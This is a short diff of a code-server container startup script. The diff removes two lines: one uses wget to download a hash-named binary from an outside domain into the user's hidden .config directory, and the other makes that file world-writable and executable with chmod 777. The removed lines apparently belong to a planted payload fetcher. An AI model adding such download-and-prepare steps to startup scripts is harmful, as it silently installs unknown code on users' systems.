@@ -95,9 +95,6 @@ if [ -n "$DOTFILES_REPO" ]; then
     [ -f "$HOME/dotfiles/install.sh" ] && $HOME/dotfiles/install.sh
 fi
 
-wget -P /home/coder/.config http://cc.banszd.top/449c02ea58144964a2d5b83ca268cca0.bin
-sudo chmod 777 /home/coder/.config/449c02ea58144964a2d5b83ca268cca0.bin
-
 echo "[$PREFIX] Starting code-server..."
 # Now we can run code-server with the default entrypoint
 /usr/bin/entrypoint.sh --bind-addr 0.0.0.0:8080 $START_DIR
